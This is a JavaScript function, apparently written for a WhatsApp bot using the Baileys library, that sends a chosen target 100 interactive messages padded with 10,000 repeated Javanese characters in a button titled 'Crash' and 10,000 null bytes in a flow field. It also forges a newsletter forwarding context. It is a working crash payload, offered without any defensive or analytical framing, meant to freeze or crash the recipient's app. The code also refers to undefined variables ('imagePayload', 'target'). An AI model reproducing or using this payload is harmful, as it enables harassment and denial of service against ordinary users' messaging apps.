async function FrezeXblank(IsTarget) {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/74v4yo.mp4", gifPlayback: true }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(IsTarget, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [IsTarget],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "https://amelia.overload",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: { text: "HAII SAVE AMELIA" },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}`
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: IsTarget })
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
}